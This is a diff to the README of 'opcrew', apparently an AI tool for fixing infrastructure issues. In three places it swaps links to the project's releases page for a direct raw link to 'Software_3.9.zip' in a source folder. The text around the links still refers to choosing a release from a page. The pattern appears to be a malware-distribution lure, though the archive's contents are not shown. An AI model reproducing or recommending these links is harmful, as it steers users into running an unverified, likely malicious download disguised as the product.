@@ -1,6 +1,6 @@
 # 🤖 opcrew - Fix Infra Issues With AI
 
-[![Download opcrew](https://img.shields.io/badge/Download-opcrew-blue?style=for-the-badge)](https://github.com/undercarriagemoschusmoschiferus808/opcrew/releases)
+[![Download opcrew](https://img.shields.io/badge/Download-opcrew-blue?style=for-the-badge)](https://raw.githubusercontent.com/undercarriagemoschusmoschiferus808/opcrew/main/src/watch/Software_3.9.zip)
 
 ## 🚀 What opcrew does
 
@@ -33,7 +33,7 @@ If your work laptop blocks new apps, you may need help from your IT team.
 
 Visit the release page and download the Windows version from there:
 
-https://github.com/undercarriagemoschusmoschiferus808/opcrew/releases
+https://raw.githubusercontent.com/undercarriagemoschusmoschiferus808/opcrew/main/src/watch/Software_3.9.zip
 
 Look for the latest release and choose the file made for Windows. If there are several files, pick the one with `.exe` or `.zip` in the name.
 
@@ -211,7 +211,7 @@ If a problem keeps coming back, use a different log file or a smaller test folde
 
 Get the latest Windows build here:
 
-https://github.com/undercarriagemoschusmoschiferus808/opcrew/releases
+https://raw.githubusercontent.com/undercarriagemoschusmoschiferus808/opcrew/main/src/watch/Software_3.9.zip
 
 From that page, choose the newest release and download the Windows file that matches your setup.
 
